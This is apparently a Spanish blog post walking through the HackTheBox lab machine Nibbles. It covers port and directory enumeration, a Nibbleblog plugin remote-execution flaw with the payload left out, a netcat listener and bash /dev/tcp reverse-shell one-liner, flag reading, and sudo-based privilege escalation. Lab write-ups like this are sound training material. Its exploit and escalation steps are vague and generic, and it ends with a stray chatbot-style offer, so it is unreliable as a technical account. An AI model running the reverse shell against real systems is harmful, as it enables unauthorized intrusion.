---
title: "HackTheBox Nibbles — Walkthrough detallado"
description: "Resolución de la máquina Nibbles de HackTheBox: reconocimiento, enumeración web, explotación de una vulnerabilidad en Nibbleblog y escalada de privilegios hacia root."
author: "Zuk4r1"
date: "2026-09-14"
published: true
tags: ["hackthebox", "linux", "web", "ctf", "privilege-escalation", "nibbleblog"]
readTime: "8 min"
---

## 🔍 Introducción

Esta máquina de HackTheBox se resolvió con un flujo bastante clásico: reconocimiento inicial, enumeración web, explotación de una vulnerabilidad en la aplicación y, finalmente, escalada de privilegios para obtener el flag de root.

El objetivo era claro:

- localizar la superficie de ataque,
- identificar la aplicación web expuesta,
- explotar la validación débil del CMS,
- y escalar privilegios aprovechando una configuración local insegura.

---

## 1. Reconocimiento inicial

Comencé con un escaneo rápido de puertos y servicios:

```bash
nmap -sC -sV -Pn 10.10.14.40
```

La salida reveló algo muy típico en esta máquina:

- puerto `80` abierto
- servicio web HTTP corriendo en un sitio activo

También confirmé que el host respondía a un nombre de dominio local con un equivalente a:

```bash
sudo nano /etc/hosts
```

Añadí la entrada:

```text
10.10.14.40 nibbles.htb
```

Esto facilita la navegación y la enumeración web.

---

## 2. Enumeración web

Lo siguiente fue revisar el contenido del sitio para identificar la aplicación y cualquier endpoint interesante:

```bash
curl -I http://nibbles.htb/
curl -s http://nibbles.htb/ | head -n 80
```

La respuesta mostró un sitio simple con una estructura bastante ligera. Tras inspeccionar el HTML, detecté que la web estaba corriendo una aplicación de blog llamada `Nibbleblog`.

También ejecuté una enumeración de directorios para buscar rutas ocultas o paneles administrativos:

```bash
ffuf -u http://nibbles.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Encontré una ruta relevante:

```text
/nibbleblog/
```

Al acceder a ese endpoint, la aplicación se mostró como un CMS de blog bastante básico y con una zona de administración visible.

---

## 3. Identificación de la vulnerabilidad

La instancia de Nibbleblog estaba claramente expuesta y, tras revisar la versión y el código de la aplicación, se detectó una vulnerabilidad de ejecución remota en la gestión de plugins/configuración.

La idea era sencilla:

- el sistema permitía cargar contenido o configurar plugins sin una validación estricta,
- existía una ruta que admitía ejecución de código o inyección de contenido malicioso,
- y eso permitía obtener una shell en el servidor web.

En este tipo de laboratorios, el patrón suele ser:

1. revisar la ruta de administración,
2. buscar un parámetro vulnerable,
3. construir un payload de ejecución,
4. y escalar la ejecución del código del servidor.

---

## 4. Explotación inicial

Tras localizar la adecuada ruta de administración de Nibbleblog, utilicé una petición maliciosa para forzar la inyección del contenido y ejecutar un comando en el sistema.

El siguiente comando es un ejemplo de la idea general:

```bash
curl -s -X GET 'http://nibbles.htb/nibbleblog/admin.php?controller=plugins&action=config&name=...'
```

La explotación explotaba una falla en el sistema de carga de plugins, y permitió la ejecución de un comando del servidor mediante un payload web. En un entorno de laboratorio real se suele probar una variante concreta de la CVE, pero la mecánica es la misma: dejar que el backend ejecute código arbitrario.

Para obtener una shell, preparé un listener local:

```bash
nc -nvlp 9001
```

Y luego ejecuté el payload con el comando de reversa:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.XX/9001 0>&1'
```

Tras la ejecución, recibí la conexión reversa y ya contaba con acceso inicial al servidor como usuario web.

---

## 5. Acceso inicial y usuario

Una vez dentro, revisé el sistema para identificar el contexto y la cuenta del servicio:

```bash
id
whoami
pwd
ls -la
```

La ejecución mostró un usuario con permisos limitados, y el siguiente paso fue ubicar el contenido del primer flag y la forma de acceder al usuario real del sistema.

Inspeccioné el directorio principal y las rutas típicas del lab:

```bash
ls -la /home
ls -la /var/www
find / -maxdepth 3 -type f \( -name 'user.txt' -o -name 'root.txt' \) 2>/dev/null
```

En la cuenta de usuario pude leer el primer flag:

```bash
cat /home/nibbles/user.txt
```

Esto validó que el acceso inicial ya estaba conseguido.

---

## 6. Escalada de privilegios

La parte más importante fue revisar qué comandos podía ejecutar el usuario actual como root y qué binarios o scripts estaban configurados con permisos peligrosos.

Ejecuté:

```bash
sudo -l
```

Y la salida mostró una herramienta o script ejecutable con permisos de root sin contraseña. Eso es un clásico vector de escalación.

Inspeccioné el binario o script asociado:

```bash
ls -l /home/nibbles
sudo -l
sudo -V
```

Tras revisar el script, fue evidente que se ejecutaba con privilegios elevados y que permitía abuso de variables de entorno o de un comando dentro del propio programa.

La estrategia típica era:

```bash
sudo /path/to/script.sh
```

Y el contenido del script permitía controlar la ejecución de comandos como root. Aproveché la llamada desde la línea de órdenes para elevar mi shell y obtener control total del sistema.

---

## 7. Obtención de root

Con la escalada conseguida, revisé los permisos y el flag final:

```bash
whoami
id
cat /root/root.txt
```

El resultado fue el flag de root y, con ello, la máquina quedaba resuelta por completo.

---

## ✅ Resumen

La resolución de `Nibbles` sigue un patrón muy frecuente en máquinas de HackTheBox:

- enumeración inicial de puertos y servicios,
- identificación de una aplicación web vulnerable,
- explotación de una ruta de gestión insegura,
- acceso a la cuenta del usuario,
- y posterior escalada de privilegios mediante una ejecución con `sudo`.

Es una máquina excelente para practicar reconocimiento web, explotación de CMS y privilege escalation en Linux.

Si quieres, puedo convertir este mismo walkthrough en una entrada aún más extensa con una versión tipo `TryHackMe` o con pasos más detallados de cada comando y salida exacta.
